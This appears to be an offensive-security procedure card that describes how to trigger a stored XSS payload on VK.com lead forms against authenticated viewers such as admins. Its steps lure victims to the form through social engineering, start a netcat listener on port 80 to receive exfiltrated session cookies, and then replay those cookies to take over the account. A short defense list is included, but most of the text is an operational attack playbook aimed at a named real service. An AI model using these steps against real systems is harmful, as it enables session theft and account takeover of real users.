---
id: proc-trigger-stored-xss
tags:
  - xss
  - execution
  - exfiltration
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/monitor-exfil-server]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:09.473Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-and-Execute-Stored-XSS

## Summary

This procedure triggers the execution of the stored XSS payload in the victim's browser by having them view the infected lead form, leading to JavaScript execution for data theft or session hijacking.

## Description

Once the payload is stored via the lead forms endpoint, it renders unsanitized when users (e.g., admins reviewing applications) load the form page. The script runs in the context of the viewer's authenticated session, allowing access to VK.com cookies, localStorage, or DOM manipulation. Common payloads exfiltrate data to an attacker server. This relies on social engineering to lure victims or natural admin workflows. Expected outcomes include receiving stolen session data, enabling account takeover.

## Requirements

1. Injected payload from prior procedure
2. Victim with VK.com authentication (e.g., admin access to forms)
3. Attacker server (e.g., HTTP listener) for receiving exfiltrated data
4. Form URL shared or accessible to victim

## Defense

Defensive measures and detection strategies:

- Escape all user-generated content on output (e.g., via OWASP guidelines)
- Implement strict XSS filters and WAF rules for script patterns
- Log and alert on data exfiltration attempts (e.g., unusual outbound requests)
- Educate users on phishing and suspicious form links

## Objectives

1. Cause payload execution in victim browser
2. Exfiltrate sensitive data like session cookies
3. Achieve session hijacking for further access

## Instructions

### Step 1: Share Infected Form

**Context**: Provide the victim with the lead form URL containing the stored payload, e.g., via email or direct link.

No command needed; use social engineering to direct to https://vk.com/lead_forms?form_id=123.

### Step 2: Monitor for Execution

**Context**: Set up a listener on your server to capture exfiltrated data from the payload.

**Command** ([[commands/monitor-exfil-server]]):
```bash
nc -lvp 80
```

> This starts a netcat listener on port 80. Expected output: Incoming HTTP requests with stolen data, e.g., GET /steal?cookie=vk_session=abc123.

### Step 3: Validate Impact

**Context**: Use received cookies to impersonate the victim session in a browser or requests.

Test by curling a protected VK.com page with the stolen cookie.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/monitor-exfil-server]]

## Tools Used


## Tags

- xss
- execution
- exfiltration
